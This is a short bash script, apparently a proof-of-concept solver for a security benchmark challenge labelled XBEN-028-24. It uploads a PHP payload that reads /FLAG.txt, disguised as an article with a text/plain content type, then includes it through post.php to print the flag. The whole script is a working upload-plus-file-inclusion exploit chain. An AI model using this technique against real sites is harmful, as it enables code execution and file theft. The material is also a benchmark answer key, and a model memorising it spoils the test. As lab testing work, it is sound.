#!/usr/bin/env bash
# XBEN-028-24 — unrestricted upload then LFI/include. Proxy-mode twin. The
# article uploader stores the file verbatim; post.php includes any path under
# uploads/, so a PHP file uploaded as an "article" executes and prints the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben028p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/posts/upload-article.php"
BASE="$(req_of GET upload-article.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/posts/upload-article.php' \
  --set 'multipart.name=poc' --set 'multipart.email=poc@example.test' \
  --set 'multipart.articleFile=<?php echo file_get_contents("/FLAG.txt"); ?>' \
  --set 'multipart.articleFile.filename=poc.php' \
  --set 'multipart.articleFile.content_type=text/plain' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/post.php' --set 'query.id=uploads/poc' >/dev/null
print_flag
